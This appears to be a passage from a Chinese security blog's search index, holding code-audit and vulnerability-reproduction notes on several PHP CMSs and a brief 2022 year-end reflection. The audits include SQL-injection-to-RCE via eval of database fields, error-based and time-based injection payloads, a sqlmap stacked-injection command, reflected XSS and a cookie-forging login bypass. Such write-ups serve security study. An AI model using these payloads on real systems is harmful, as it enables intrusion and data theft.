$Model-&gt;fetchAll(\\PDO::FETCH_ASSOC);\n\t\t\treturn $m_data;\n\t\t&#125;\n\t\tcatch (\\PDOException $e) &#123;\n\t\t\texit($e -&gt; getMessage());\n\t\t&#125;\n&#125;\n\n可以看到直接拼接，只有前面的index.php有一个全局过滤\n所以，api里面的类只要继承了common.php的common类，并且调用了父类common的init方法，就能通过它产生注入\n那么，很简单了，接下来就直接找符合上面条件的类就行了\nSingleCard类class SingleCard extends Common &#123;\n\tfunction __construct() &#123;\n\t\tparent::init();\n\t&#125;\n\nUser类class User extends Common &#123;\n\tfunction __construct() &#123;\n\t\tparent::init();\n\t&#125;\n\n剩下一个插件类，发现直接执行了sql语句，但是很可惜前面有全局过滤，而这个语句又经过了单引号包裹，所以无法注入\nPlugin类public function getApi($id,$name&#x3D;&#39;&#39;) &#123;\n\t\t$con &#x3D; Db::getInstance();\n\t\t$res &#x3D; $con-&gt;select(&#39;plugin&#39;,&quot;directory&#x3D;&#39;&#123;$id&#125;&#39;&quot;);\n\n这也只能算是一个注入点\n后面的都携带了单引号，没带的也都有复杂的处理流程，就是这个数据是先在数据库里面查了一遍的。也就是先带单引号查询了一遍，之后再将查询结果的数据取出再带入查询\n没有前台，只有接口，接口就是数据库查询，数据处理\n那这样的话，前台的漏洞应该就这个了，比sql注入危害小的漏洞，使用sql注入来达到漏洞利用的话有点小题大做。\n也就rce了，这个我是真的没想到，审计的太少，还得练\n直接看参考资料的利用方式来将sql注入的危害扩大\n使用的是危险函数查找的方法，全局搜素eval函数 ：eval(  只有两个文件有\nRCE一个还是api的控制器common.php，另外一个也是api的控制器Sofeware.php。刚刚提到过，这个程序就是不断查询数据库，插入内容，取出内容。而这个eval函数就是取出内容的时候使用的：\ncommon.phpprotected function init() &#123;\n\t\trequire BX_ROOT . &#39;app&#x2F;api&#x2F;api_function.php&#39;;\n\t\t$id &#x3D; !empty($_POST[&#39;id&#39;]) ? $_POST[&#39;id&#39;] : exit(api_json(&#39;400&#39;,&#39;&#39;,false));\n\t\t$data &#x3D; !empty($_POST[&#39;data&#39;]) ? $_POST[&#39;data&#39;] : exit(api_json(&#39;400&#39;,&#39;&#39;,false));\n\t\t$this-&gt;con &#x3D; Db::getInstance();\n\t\t$this-&gt;software &#x3D; $this-&gt;con-&gt;select(&#39;software&#39;,&quot;id&#x3D;&#123;$id&#125;&quot;);\n\t\tif(!$this-&gt;software) &#123;\n\t\t\texit(api_json(&#39;404&#39;,&#39;&#39;,false));\n\t\t&#125;\n\t\t$this-&gt;isBlackIp();\n\t\t$this-&gt;log &#x3D; new InsertLog($this-&gt;software[&#39;0&#39;][&#39;id&#39;]);\n\t\tdefine(&#39;API_ENCRYPT&#39;,$this-&gt;software[&#39;0&#39;][&#39;encrypt&#39;]);\n\t\tdefine(&#39;API_KEY&#39;,$this-&gt;software[&#39;0&#39;][&#39;s_key&#39;]);\n\t\tif(API_ENCRYPT &#x3D;&#x3D; &#39;defined_encrypt&#39;) &#123;\n\t\t\teval($this-&gt;software[&#39;0&#39;][&#39;defined_encrypt&#39;]);\n\t\t&#125;\n\nsoftware.phppublic function remoteFun() &#123;\n\t\t$data &#x3D; $this-&gt;parseData();\n\t\tempty($data[&#39;name&#39;]) ? exit(api_json(&#39;1402&#39;)) : FALSE;\n\t\tdo_action(&#39;api_software_remote_fun&#39;,[$data]);\n\t\teval($this-&gt;software[&#39;0&#39;][&#39;remote&#39;]);\n\t\tif(!function_exists($data[&#39;name&#39;])) &#123;\n\t\t\texit(api_json(&#39;1401&#39;));\n\t\t&#125;\n\t\t$fun_param_num &#x3D; count(get_fucntion_parameter_name($data[&#39;name&#39;]));\n\t\tif($fun_param_num !&#x3D; &#39;0&#39;) &#123;\n\t\t\tempty($data[&#39;param&#39;]) ? exit(api_json(&#39;1402&#39;)) : FALSE;\n\t\t\t$res_param_num &#x3D; count($data[&#39;param&#39;]);\n\t\t\tif($fun_param_num !&#x3D; $res_param_num) &#123;\n\t\t\t\texit(api_json(&#39;1403&#39;));\n\t\t\t&#125;\n\t\t&#125; else &#123;\n\t\t\t$data[&#39;param&#39;] &#x3D; array();\n\t\t&#125;\n\t\texit(api_json(&#39;1408&#39;, array(&#39;result&#39;&#x3D;&gt;@call_user_func_array($data[&#39;name&#39;],$data[&#39;param&#39;])) ));\n\t&#125;\n\n这时取出的数据库内容执行，要是没有前面的sql注入，我们是无法控制数据库的某个字段的内容的。但是现在有了sql注入漏洞，我们只需通过注入漏洞将取出的这个字段的内容修改成我们需要执行的代码，再通过触发该函数来执行代码。\n刚好common.php是前台可访问的，software.php也是前面可以访问的。这样就有了前台的RCE\n直接在本地修改mysql的字段看看能不能RCE，先看common.php的init函数提取的内容\n添加一个software，common.php显示当设置encrypt为defined_encrypt时，将会取出defined_encrypt的值，并使用eval函数执行代码。所以只需要修改这两条数据就行了，其他数据随便输入\ninsert into BX_software (name,heart_time,version,notice,static_data,give_time,give_point,login_type,update_data,update_type,trial_interval,trial_data,software_state,binding_type,bindingdel_type,bindingdel_time,bindingdel_point,restrict_regtime,restrict_regnum,s_key,menber_id,remote,encrypt,defined_encrypt) values (&#39;1&#39;,&#39;180&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;24&#39;,&#39;3&#39;,&#39;hblQ2Sy1v7hzecAgnltsnbx7EsIex7AV6f33EmT9&#39;,&#39;1&#39;,&#39;&#39;,&#39;defined_encrypt&#39;,&#39;phpinfo();&#39;);\n\n接下来直接访问api的Software不需要添加方法，因为会默认执行\n\n这里的id就是刚刚才入的那条数据的id，data为任意值\n再看看software提取的内容，提取remote的内容eval执行，在插入一条数据，修改remote字段为phpinfo();\ninsert into BX_software (name,heart_time,version,notice,static_data,give_time,give_point,login_type,update_data,update_type,trial_interval,trial_data,software_state,binding_type,bindingdel_type,bindingdel_time,bindingdel_point,restrict_regtime,restrict_regnum,s_key,menber_id,remote,encrypt,defined_encrypt) values (&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;phpinfo();&#39;,&#39;1&#39;,&#39;&#39;);\n\n使用远程调用函数的api\n\n怎么没有执行代码呢？查了一下代码发现，再common.php的init函数的最后面。当对data数据进行解密后会进行判断，不成功会直接返回400，查看解密函数\nfunction bx_decrypt($data,$key,$type) &#123;\n\tswitch ($type) &#123;\n\t\tcase &#39;authcode&#39;: return authcode($data,&#39;DECODE&#39;,$key);\n\t\tbreak;\n\t\tcase &#39;rc4&#39;: return rc4($key,base64_decode($data));\n\t\tbreak;\n\t\tcase &#39;no&#39;: return stripslashes($data);\n\t\tbreak;\n\t\tcase &#39;defined_encrypt&#39;: return @call_user_func_array(&#39;bx_defined_decrypt&#39;,array($data,$key));\n\t\tbreak;\n\t\tdefault: break;\n\t&#125;\n&#125;\n\n所以需要修改encrypt的值为no就行了\nupdate bx_software set encrypt=’no’ where id =4;\n接着访问，发现返回1402表示缺少参数\n\n看一下代码发现需要再data中有name的值，并使用了解析，发现是json，直接将data数据改为json格式并且添加name字段值\n\n成功\n实战时如何修改或是插入数据呢？参考文章2提到可以使用堆叠注入获取sql-shell来执行sql语句\npython3 sqlmap.py -r 1.txt –dbms=mysql -p “id”  –technique=S –sql-shell \n小结：官方文档真的特别重要！！！！！\n后台的我就不看了，没什么意思。。。\n吐槽：好冷啊！！！\n还是太菜了，听说php都没什么用了。大部分人现在都在卷java，后面还是审计一些Java的cms吧！php的漏洞玩的都是16，17年玩剩下的了。代码审计星球里几年前php的技巧都不会。。。。。就是走前人走过的路都要花费很长时间啊！！！更别说找出点自己独门的技巧了！！\n真冷！！！\n","slug":"冰心网络验证平台3-1审计或漏洞复现","date":"2022-12-01T07:04:21.000Z","categories_index":"代码审计","tags_index":"PHP","author_index":"Longw"},{"id":"2c9fa563608f4b9eb0cd953103b9e032","title":"2022小结","content":"\n\n总算是把那一本考点单词书背了一遍。\nphp审计入门了，还得多练。\nJava安全还在入门，要点太多，特性太多，需要点时间。\n最近正好学了一下数据结构和算法，用Java实现，也算是练了一点Java基础。\n以前看那些搞Java安全比较出名的白帽，不懂为什么有些一直在焦虑自己菜。直到看到了有些大佬自己的总结笔记之类的，才发现这个Java安全真是tmd太多内容了，要学到什么时候。感觉自己现在的水平实在是菜的过分，再一想他们的年纪有的比自己还小，我也焦虑了。不过我的自我调节还行，焦虑什么的意思意思就行了，慢慢学总有一天能好的。\n毕竟他们这些大佬面对的是职场，对技术要求高。我辞职之后躺平在家有的是时间学基础，完全不慌。\n实习让我入门了安全界，回来之后有了学习方向，明白自己哪些是必须要学的。有针对性的学习效率总是高的。\n今年还有一个半月，尽量入门Java安全。基础有了后面就可以慢慢提高了。明年可能压根没时间学安全。\n","slug":"2022小结","date":"2022-11-14T03:11:36.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"733b83aa3a6de6561189f92e947083a6","title":"熊海cmsV1.0审计","content":"\n\n站长之家的源码库获取的代码\nCREATE DATABASE xhcms DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;\nphp5.4.45 \nadmin admin \n看代码量挺少的，先试试全文\n全文审计index.php通过r参数，传值到file文件的php里面\n&lt;?php\n&#x2F;&#x2F;单一入口模式\nerror_reporting(0); &#x2F;&#x2F;关闭错误显示\n$file&#x3D;addslashes($_GET[&#39;r&#39;]); &#x2F;&#x2F;接收文件名\n$action&#x3D;$file&#x3D;&#x3D;&#39;&#39;?&#39;index&#39;:$file; &#x2F;&#x2F;判断为空或者等于index\necho $action; &#x2F;&#x2F;方便看传入内容添加的\ninclude(&#39;files&#x2F;&#39;.$action.&#39;.php&#39;); &#x2F;&#x2F;载入相应文件\n?&gt;\n\n好像有目录穿越漏洞，再WWW目录下新建一个1.php，内容为aaaa。。。\n\n成功读取文件内容\n但是后缀是php，看看能不能截断后缀\nhttps://www.cnblogs.com/nanamiblog/p/14369476.html\n\n%00截断 php&lt;5.3\n\nphp版本是5.4.45，或GPC为off，%00截断就不行了，还有使用了addslashes()函数也不行\n\n垃圾字符截断  php&lt;5.3\n\nwin 使用./ 填充259次\nlinux 使用./填充2038次\n\n开启远程文件包含的情况下通过?好截断\n\n?r=http://xxx/1.txt?\n将后面的?当作参数，前面的内容返回不影响\n那现在暂时没什么用了，跳过，看看后面的文件能不能有点用\n可以看到，默认包含的file文件夹下，现在直接看file文件夹的内容\n代码审计星球里提到的利用方式：https://t.zsxq.com/07JS1dEcQ\n还可以试试伪协议，包含日志，环境变量\n上传功能只有后台有，gg\nfiles/index.php包含了inc/301.php，inc/conn.php，inc/time.class.php\n301的内容为空\nconn中是数据库配置\ntime.class是一个时间转换函数\n后面又包含template\\header.php，里面只是模板输出\ntemplate\\footer.php，也是模板输出\n没有可控变量，直接过\nfiles/about.php包含\nconn，time.class\n第一个sql语句引号包裹，经过过滤\n包含template下所有文件，全是模板输出\n没有内容了\n只能通过index的r参数访问，直接访问会报错，包含文件路径的问题\nfiles/contact.phpconn，time.class等\n其中只有page参数可控，且进行了echo，有反射xss\n$page&#x3D;addslashes($_GET[&#39;page&#39;]);\nif ($page&lt;&gt;&quot;&quot;)&#123;\nif ($page&lt;&gt;1)&#123;\n$pages&#x3D;&quot;第&quot;.$page.&quot;页 - &quot;;\n&#125;\n&#125;\n\n输出语句\n&lt;title&gt;&lt;?php echo $navs[&#39;name&#39;]?&gt; - &lt;?php echo $pages.$info[&#39;name&#39;]?&gt;&lt;&#x2F;title&gt;\n\n直接传参?r=contact&amp;page=alert(1)\n弹窗了\n\n其他的值都是经过数学计算处理之后才传入的sql语句\nfiles/content.php包含一样的就不写了\n第二个可控的sql语句有数字型注入\n$id&#x3D;addslashes($_GET[&#39;cid&#39;]);\n\nsql语句\n&#x2F;&#x2F;浏览计数\n$query &#x3D; &quot;UPDATE content SET hit &#x3D; hit+1 WHERE id&#x3D;$id&quot;;\n@mysql_query($query) or die(&#39;修改错误：&#39;.mysql_error());\n\n这里存在报错注入\npayload：?r=content&amp;cid=9 and updatexml(1,concat(0x7e,database(),0x7e),1)\n\n同时也echo了这个id，反射xss\n&lt;form  name&#x3D;&quot;form&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;&#x2F;?r&#x3D;submit&amp;type&#x3D;comment&amp;cid&#x3D;&lt;?php echo $id?&gt;&quot;&gt;\n\npayload：?r=content&amp;cid=alert(1)\n\nfiles/download.php同前面一样有个echo 反射xss\n$yemas&#x3D;$_GET[&#39;page&#39;];\nif ($yemas&lt;&gt;&quot;&quot;)&#123;\n$yema&#x3D;&quot; - 第 $yemas 页&quot;;\n&#125;else&#123;\n$yema&#x3D;&quot;&quot;;\t\n&#125;\n\n&lt;?php echo $yema ?&gt;\n\n不验证了\nfiles/downloads.php文件下载的，没看出说明问题\nfiles/list.php反射xss\nfiles/pages.php没啥问题\nfiles/software.php有报错注入，update语句，跟前面那个一样\n后面又有一个echo xss\nfiles/submit.phppost提交的没有过滤，好多注入点\n其中提交的cid有多个注入的语句\n不验证了\ninc/checklogin.php这个检测可以伪造\n&lt;?php\n$user&#x3D;$_COOKIE[&#39;user&#39;];\nif ($user&#x3D;&#x3D;&quot;&quot;)&#123;\nheader(&quot;Location: ?r&#x3D;login&quot;);\nexit;\t\n&#125;\n?&gt;\n\n可以看到只要cookie的内容里有user字段的值就能绕过登陆检查\n将里面的跳转去掉，添加一句echo ‘没有绕过’;\n在新建一个test.php，包含登录检查\n&lt;?php\ninclude &#39;inc&#x2F;checklogin.php&#39;;\necho &#39;绕过了&#39;;\n?&gt;\n\n正常访问，显示的是没有绕过\n\n当添加user字段后，就绕过了\n\n其实这个应该一眼就看出来了，验证是防止误判，仔细一点总是好的\nadmin/index.php跟index.php一样的，但是这里使用了上面的checklogin.php验证登录，这不是随便进吗?\n添加cookie字段user=xxxx，直接进后台\n\n前面正常则通过files/login.php，看一下登录\nadmin/files/login.php直接用户名来了个sql注入\n&lt;?php \nob_start();\nrequire &#39;..&#x2F;inc&#x2F;conn.php&#39;;\n$login&#x3D;$_POST[&#39;login&#39;];\n$user&#x3D;$_POST[&#39;user&#39;];\n$password&#x3D;$_POST[&#39;password&#39;];\n$checkbox&#x3D;$_POST[&#39;checkbox&#39;];\n\nif ($login&lt;&gt;&quot;&quot;)&#123;\n$query &#x3D; &quot;SELECT * FROM manage WHERE user&#x3D;&#39;$user&#39;&quot;;\n\n输入a’ ，直接报错\n\n后面就是一套基本操作了，可以直接sqlmap跑出来\nadmin/files/adset.php都过滤了\nadmin/files/columnlist.php&lt;?php\nrequire &#39;..&#x2F;inc&#x2F;checklogin.php&#39;;\nrequire &#39;..&#x2F;inc&#x2F;conn.php&#39;;\n$columnlistopen&#x3D;&#39;class&#x3D;&quot;open&quot;&#39;;\n\n$delete&#x3D;$_GET[&#39;delete&#39;];\n\n$delete2&#x3D;$_GET[&#39;delete2&#39;];\n\nif ($delete&lt;&gt;&quot;&quot;)&#123;\n$query &#x3D; &quot;DELETE FROM nav WHERE id&#x3D;&#39;$delete&#39;&quot;;\n$result &#x3D; mysql_query($query) or die(&#39;SQL语句有误：&#39;.mysql_error());\necho &quot;&lt;script&gt;alert(&#39;亲，ID为&quot;.$delete.&quot;的栏目已经成功删除！&#39;);location.href&#x3D;&#39;?r&#x3D;columnlist&#39;&lt;&#x2F;script&gt;&quot;;\nexit; \n&#125;\nif ($delete2&lt;&gt;&quot;&quot;)&#123;\n$query &#x3D; &quot;DELETE FROM navclass WHERE id&#x3D;&#39;$delete2&#39;&quot;;\n$result &#x3D; mysql_query($query) or die(&#39;SQL语句有误：&#39;.mysql_error());\necho &quot;&lt;script&gt;alert(&#39;亲，ID为&quot;.$delete2.&quot;的二级栏目已经成功删除！&#39;);location.href&#x3D;&#39;?r&#x3D;columnlist&#39;&lt;&#x2F;script&gt;&quot;;\nexit; \n&#125;\n?&gt;\n\n两个delete参数没有过滤，直接注入\nadmin/files/commentlist.php跟前一个一样，delete参数注入\nadmin/files/editcolumn.php有sql的地方全是注入\nadmin/files/editlink.php一样，注入\nadmin/files/linklist.php有反射xss，echo的\n有注入\nadmin/files/newlink.php注入\nadmin/files/newsoft.php有注入，好像这些新增代码都有点问题，没写对，插入一个却报错了\n上传后面测\nadmin/files/newwz.php也有注入，可能语句也有问题\nadmin/files/reply.php很多注入\nadmin/files/seniorset.php注入\nadmin/files/siteset.php注入\nadmin/files/softlist.php注入，反射xss\nadmin/files/wzlist.php跟上面简直一摸一样\n现在看那些上传点    代码有问题，不测了都包含inc/up.class.php\nadmin/files/editsoft.php一样，注入\n有上传，编辑器\nadmin/files/editwz.php内容跟上一个一样，有上传\nadmin/files/imageset.php有注入\nadmin/files/manageinfo.php  正常有注入，存储型xss，先试试，确认了\n\n有上传，白名单\n测试伪协议发现不行，算了，多看几篇文章学学去\nadmin/files/newcolumn.php  编辑器存储xss，sql注入\n保存到数据库有点问题，输入正常数据也报错\n有一个编辑器\n吐槽：可能是获取的源代码有点问题，后台上传一直在报错，不看了，后面再找找新版的源码\n","slug":"熊海cmsV1-0审计","date":"2022-11-06T11:58:19.000Z","categories_index":"代码审计","tags_index":"PHP","author_index":"Longw"},{"id":"880e1af7df287b27c3dd9350df565202","title":"快看cms-sql注入审计","content":"\n\n安装：https://github.com/erichuang2015/kkcms\n直接安装 php5.6.9  数据库 kk\n先直接使用Seay扫描，接下来一个一个看扫描结果\nsql注入疑似点：book.php&lt;?php \ninclude(&#39;system&#x2F;inc.php&#39;);\nif(isset($_POST[&#39;submit&#39;]))&#123;\n\tif ($_SESSION[&#39;verifycode&#39;] !&#x3D; $_POST[&#39;verifycode&#39;]) &#123;\n\t\talert_href(&#39;验证码错误&#39;,&#39;book.php&#39;);\n\t&#125;\n    null_back($_POST[&#39;userid&#39;],&#39;请填写昵称&#39;);\n\tnull_back($_POST[&#39;content&#39;],&#39;请填写留言内容&#39;);\n\t$data[&#39;userid&#39;] &#x3D; $_POST[&#39;userid&#39;];\n\t$data[&#39;content&#39;] &#x3D;addslashes($_POST[&#39;content&#39;]);\n\t$data[&#39;time&#39;] &#x3D;date(&#39;y-m-d h:i:s&#39;,time());\n\t\n\t$str &#x3D; arrtoinsert($data);\n\t\t$sql &#x3D; &#39;insert into xtcms_book (&#39;.$str[0].&#39;) values (&#39;.$str[1].&#39;)&#39;;\n\t\techo $sql;\n\tif(mysql_query($sql))&#123;\n\nalert_href(&#39;留言成功!小的马上为您准备相关资源！&#39;,&#39;book.php&#39;);\n&#125;\nelse&#123;\nalert_back(&#39;抱歉！服务器好像开小差了呢！&#39;);\n\t&#125;\n\t\n\t\n&#125;\ninclude(&#39;template&#x2F;&#39;.$xtcms_bdyun.&#39;&#x2F;book.php&#39;);\n?&gt;\n\n一处失败sql注入，学习了一下insert注入，也不亏\ninsert注入，时间盲注：https://www.cnblogs.com/lixiongji/p/14035159.html\n在book.php留言处，userid看到没有过滤，尝试发现在包含文件的system\\library.php中对get，post，cookie，request都进行了一次addslashes过滤\n&lt;?php\n\nif (!defined(&#39;PCFINAL&#39;)) &#123;\n\texit(&#39;Request Error!&#39;);\n&#125;\nif (!get_magic_quotes_gpc()) &#123;\n\tif (!empty($_GET)) &#123;\n\t\t$_GET &#x3D; addslashes_deep($_GET);\n\t&#125;\n\tif (!empty($_POST)) &#123;\n\t\t$_POST &#x3D; addslashes_deep($_POST);\n\t&#125;\n\t$_COOKIE &#x3D; addslashes_deep($_COOKIE);\n\t$_REQUEST &#x3D; addslashes_deep($_REQUEST);\n&#125;\nfunction addslashes_deep($_var_0)\n&#123;\n\tif (empty($_var_0)) &#123;\n\t\treturn $_var_0;\n\t&#125; else &#123;\n\t\treturn is_array($_var_0) ? array_map(&#39;addslashes_deep&#39;, $_var_0) : addslashes($_var_0);\n\t&#125;\n&#125;\n\n在这里存在验证码复用漏洞，用burp发包修改验证码为页面验证码，burp默认不会加载js，就可以重复使用该验证码\n$_session存储在服务器端，$_cookie存储在浏览器\nhttps://www.cnblogs.com/muxiaoye/p/b6f559cf8e9ac31356fe70edab0629b9.html\naddfav.php和前面那个一样\nbplay.php  有一样，没想到，这里的id写法有问题，可以直接注入\nhttp://192.168.0.107:8084/bplay.php?play=1 and if(1=1,sleep(3),0);#\nmpaly.php发现会对$_GET传入的url进行一次base64解码，可能有点希望\nif ($_GET[&quot;url&quot;]) &#123;\n    $link &#x3D; base64_decode($_GET[&quot;url&quot;]);\n\n直接先看一种情况，如果有url参数，且$idd==2，将$link赋值给$fang\n之后直接mysql_query()\n$result1 &#x3D; mysql_query(&#39;select * from xtcms_vod_class where c_id&#x3D;&#39; . $d_parent . &#39; order by c_id asc&#39;);\n\n这里的$d_parent是哪里来的呢？全局搜索没发现那里定义了，调试发现这个值是未定义，真无语 。可能存在注入，只要可控，毕竟没有引号闭合。\nmplayo.php跟前面mplay.php代码一摸一样，这个值也是未定义，直接走，可能是别的文件包含的\nyoulian.php跟book.php一样\nadmin后台注入admin/cms_backup.php值不可控\nadmin/cms_zwcs.php经过了过滤\nadmin/getdata.php   有注入这个可能有点希望，但是这个文件没有包含数据库配置文件\n同时也没有登录验证，可以直接访问\n经过测试，找到了注入点。但是，有个问题，这里没有包括数据库配置文件，sql语句无法执行\n&lt;?php\ninclude(&#39;..&#x2F;system&#x2F;inc.php&#39;);  #为了方便验证特意加的\nif (isset($_GET[&#39;play&#39;])) &#123;\n\t$d_parent &#x3D; $_GET[&#39;d_parent&#39;];\n\t$d_player &#x3D; $_GET[&#39;d_player&#39;];\n\t$zhui &#x3D; $_GET[&#39;zhui&#39;];\n\t$player &#x3D; $_GET[&#39;play&#39;];\n\tif ($_GET[&#39;play&#39;] &#x3D;&#x3D; &#39;&#39;) &#123;\n\t\techo &#39;影片不能为空!&#39;;\n\t&#125;\n\t$d_parent &#x3D; $_GET[&#39;d_parent&#39;];\n\t$d_player &#x3D; $_GET[&#39;d_player&#39;];\n\t$zhui &#x3D; $_GET[&#39;zhui&#39;];\n\t$player &#x3D; base64_decode($_GET[&#39;play&#39;]);\n\t$tvinfo &#x3D; file_get_contents($player);\n\t$tvpm &#x3D; &#39;#&lt;h2&gt;(.*?)&lt;&#x2F;h2&gt;#&#39;;\n\t$tvzy &#x3D; &#39;#&lt;li&gt;主演：&lt;span&gt;(.*?)&lt;&#x2F;span&gt;&lt;&#x2F;li&gt;#&#39;;\n\t$tvtp &#x3D; &#39;#&lt;img class&#x3D;&quot;lazy&quot; src&#x3D;&quot;(.*?)&quot; alt&#x3D;&quot;(.*?)&quot; &#x2F;&gt;#&#39;;\n\t$tvzz &#x3D; &#39;#&lt;li&gt;&lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;copy_sel&quot; value&#x3D;&quot;(.*?)&quot; checked&#x3D;&quot;&quot; &#x2F;&gt;(.*?)&lt;&#x2F;li&gt;#&#39;;\n\t$jianjie &#x3D; &#39;#&lt;div class&#x3D;&quot;vodplayinfo&quot;&gt;(.*?)&lt;&#x2F;div&gt;#&#39;;\n\tpreg_match_all($jianjie, $tvinfo, $jjarr);\n\tpreg_match_all($tvzz, $tvinfo, $tvarr);\n\tpreg_match_all($tvpm, $tvinfo, $btarr);\n\tpreg_match_all($tvzy, $tvinfo, $zyarr);\n\tpreg_match_all($tvtp, $tvinfo, $tparr);\n\t$title &#x3D; $btarr[1];\n\t$tupian &#x3D; $tparr[1];\n\t$zhuyan &#x3D; $zyarr[1];\n\t$dizhi &#x3D; $tvarr[2];\n\t$jj &#x3D; $jjarr[1];\n\t$huiche &#x3D; &#39;\n&#39;;\n\tif (!empty($title)) &#123;\n\t\tforeach ($title as $key &#x3D;&gt; $video) &#123;\n\t\t\t$titile &#x3D; str_replace(&#39;&lt;!--片名开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$title[$key]&#125;&quot;);\n\t\t\t$titile &#x3D; str_replace(&#39;&lt;!--片名结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$titile&#125;&quot;);\n\t\t\t$jieshao &#x3D; str_replace(&#39;&lt;!--介绍开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$jj[$key]&#125;&quot;);\n\t\t\t$jieshao &#x3D; str_replace(&#39;&lt;!--介绍结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$jieshao&#125;&quot;);\n\t\t\t$zyan &#x3D; str_replace(&#39;&lt;!--主演开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$zhuyan[$key]&#125;&quot;);\n\t\t\t$zyan &#x3D; str_replace(&#39;&lt;!--主演结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$zyan&#125;&quot;);\n\t\t\t$pic &#x3D; str_replace(&#39;http:&#x2F;&#x2F;cj.baiwanzy.com&#x2F;LdgImg.php?url&#x3D;&#39;, &#39;&#39;, &quot;&#123;$tupian[$key]&#125;&quot;);\n\t\t\tforeach ($dizhi as $k &#x3D;&gt; $vurl) &#123;\n\t\t\t\tif (strpos($dizhi[$k], &#39;m3u8&#39;)) &#123;\n\t\t\t\t\t$m3u8[] &#x3D; $dizhi[$k] . $huiche;\n\t\t\t\t&#125; elseif (strpos($dizhi[$k], &#39;mp4&#39;)) &#123;\n\t\t\t\t\t$mp4[] &#x3D; $dizhi[$k] . $huiche;\n\t\t\t\t&#125; else &#123;\n\t\t\t\t\t$zhilian[] &#x3D; $dizhi[$k] . $huiche;\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t\tif ($zhui &#x3D;&#x3D; 0) &#123;\n\t\t\t\t$_data[&#39;d_scontent&#39;] &#x3D; &#39;&#39; . implode(&#39;&#39;, $zhilian) . &#39;&#39;;\n\t\t\t&#125; elseif ($zhui &#x3D;&#x3D; 1) &#123;\n\t\t\t\t$_data[&#39;d_scontent&#39;] &#x3D; &#39;&#39; . implode(&#39;&#39;, $m3u8) . &#39;&#39;;\n\t\t\t&#125; elseif ($zhui &#x3D;&#x3D; 2) &#123;\n\t\t\t\t$_data[&#39;d_scontent&#39;] &#x3D; &#39;&#39; . implode(&#39;&#39;, $mp4) . &#39;&#39;;\n\t\t\t&#125;\n\t\t\t$_data[&#39;d_player&#39;] &#x3D; $d_player;\n\t\t\t$_data[&#39;d_name&#39;] &#x3D; $titile;\n\t\t\t$_data[&#39;d_zhuyan&#39;] &#x3D; $zyan;\n\t\t\t$_data[&#39;d_picture&#39;] &#x3D; $pic;\n\t\t\t$_data[&#39;d_content&#39;] &#x3D; $jieshao;\n\t\t\t$_data[&#39;d_parent&#39;] &#x3D; $d_parent;\n\t\t\t$str &#x3D; arrtoinsert($_data);\n\t\t\t$result &#x3D; mysql_query(&#39;select * from xtcms_vod where d_name&#x3D; &quot;&#39; . $titile . &#39;&quot;&#39;);\n\t\t\tif (mysql_fetch_array($result)) &#123;\n\t\t\t\t$sql &#x3D; &#39;update xtcms_vod set &#39; . arrtoupdate($_data) . &#39; where d_name&#x3D;&quot;&#39; . $titile . &#39;&quot;&#39;;\n\t\t\t\tif (mysql_query($sql)) &#123;\n\t\t\t\t&#125;\n\t\t\t\techo &#39;&lt;script&gt;alert(&quot;影片重复更新最新地址成功!&quot;);window.opener&#x3D;null;window.close();&lt;&#x2F;script&gt;&#39;;\n\t\t\t&#125; else &#123;\n\t\t\t\t$sql &#x3D; &#39;insert into xtcms_vod (&#39; . $str[0] . &#39;) values (&#39; . $str[1] . &#39;)&#39;;\n\t\t\t\tif (mysql_query($sql)) &#123;\n\t\t\t\t\techo &#39;&lt;script&gt;alert(&quot;影片采集成功!&quot;);window.opener&#x3D;null;window.close();&lt;&#x2F;script&gt;&#39;;\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n&#125;\nif (isset($_POST[&#39;execute&#39;])) &#123;\n\tnull_back($_POST[&#39;id&#39;], &#39;请至少选中一项！&#39;);\n\t$s &#x3D; &#39;&#39;;\n\t$id &#x3D; &#39;&#39;;\n\tforeach ($_POST[&#39;id&#39;] as $value) &#123;\n\t\t$id .&#x3D; $s . $value;\n\t\t$s &#x3D; &#39;,&#39;;\n\t&#125;\n\tswitch ($_POST[&#39;execute_method&#39;]) &#123;\n\t\tcase &#39;srec&#39;:\n\t\t\t$sql &#x3D; &#39;update xtcms_vod set d_rec &#x3D; 1 where d_id in (&#39; . $id . &#39;)&#39;;\n\t\t\tbreak;\n\t\tcase &#39;crec&#39;:\n\t\t\t$sql &#x3D; &#39;update xtcms_vod set d_rec &#x3D; 0 where d_id in (&#39; . $id . &#39;)&#39;;\n\t\t\tbreak;\n\t\tcase &#39;shot&#39;:\n\t\t\t$sql &#x3D; &#39;update xtcms_vod set d_hot &#x3D; 1 where d_id in (&#39; . $id . &#39;)&#39;;\n\t\t\tbreak;\n\t\tcase &#39;chot&#39;:\n\t\t\t$sql &#x3D; &#39;update xtcms_vod set d_hot &#x3D; 0 where d_id in (&#39; . $id . &#39;)&#39;;\n\t\t\tbreak;\n\t\tcase &#39;delete&#39;:\n\t\t\t$sql &#x3D; &#39;delete from xtcms_vod where d_id in (&#39; . $id . &#39;)&#39;;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\talert_back(&#39;请选择要执行的操作&#39;);\n\t&#125;\n\tmysql_query($sql);\n\talert_href(&#39;执行成功!&#39;, 